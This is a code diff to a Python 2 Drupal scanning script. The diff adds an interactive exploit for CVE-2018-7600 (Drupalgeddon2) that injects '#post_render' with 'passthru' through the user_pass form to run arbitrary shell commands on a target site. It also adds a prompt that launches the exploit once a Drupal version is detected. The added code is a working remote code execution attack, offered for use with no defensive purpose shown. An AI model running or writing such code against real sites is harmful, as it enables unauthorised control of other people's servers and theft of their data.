@@ -11,6 +11,27 @@ class bcolors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
+############################### CVE 2018-7600 ################################
+def exploit1(host):
+
+	HOST=raw_input("URL :")
+	while True:
+		cmq = raw_input("Command > ")
+		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':cmq, 'name[#type]':'markup'}
+		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
+		r = requests.post(HOST, data=post_params, params=get_params)
+
+		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
+		if m:
+		    found = m.group(1)
+		    get_params = {'q':'file/ajax/name/#value/' + found}
+		    post_params = {'form_build_id':found}
+		    r = requests.post(HOST, data=post_params, params=get_params)
+		    print(r.text)
+
+
+
+############################### /CVE 2018-7600\ ################################
 
 ############################### GET VERSION FUNCTION
 def get_version(url):
@@ -28,11 +49,16 @@ def get_version(url):
 		
 		if "Drupal" in contents:	
 			splitted = contents.split()
-			print "[+]"+ url +" Version : " + splitted[1]
+			print bcolors.OKGREEN + "[+]"+ url +" Version : " + splitted[1] + bcolors.ENDC
+			okno = raw_input("Do you want exploit ? [Y/n]")
+			if okno == "Y":
+				exploit1(url)
 		else:
-			print "[-] It is not Drupal"
+			print bcolors.FAIL + "[-]"+ url +" It is not Drupal" + bcolors.ENDC
 	except requests.ConnectionError:
-		print "[-] Connection Failed !"
+		print bcolors.FAIL + "[-]"+ url +" Connection Failed !" + bcolors.ENDC
+	except requests.InvalidURL:
+		print bcolors.FAIL + "[-]"+ url +" Invalid URL !" + bcolors.ENDC
 ########################### GET VERSION FUNCTION
 target = raw_input(bcolors.OKGREEN + "Target :" + bcolors.ENDC)
 yn = raw_input(bcolors.WARNING + "Do you want use proxy ?"+ bcolors.BOLD +"[Y/N] :" + bcolors.ENDC)
